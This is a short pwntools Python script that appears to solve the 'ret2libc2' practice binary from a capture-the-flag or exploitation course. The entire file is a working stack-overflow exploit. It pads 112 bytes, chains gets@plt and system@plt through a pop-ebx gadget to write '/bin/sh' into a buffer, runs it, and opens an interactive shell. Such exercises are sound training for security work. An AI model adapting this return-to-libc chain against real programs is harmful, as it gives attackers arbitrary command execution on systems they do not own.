from pwn import *

io = process("./ret2libc2")

pop_ebx_ret = 0x0804843d

gets_plt = 0x8048460

system_plt = 0x8048490

buf2 = 0x0804a080

#payload = b'A'*(108+4) + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)

payload = flat(b'A'*112, gets_plt, pop_ebx_ret, buf2, system_plt, pop_ebx_ret, buf2) 

io.recv()

io.sendline(payload)

io.sendline(b"/bin/sh\x00")

io.interactive()
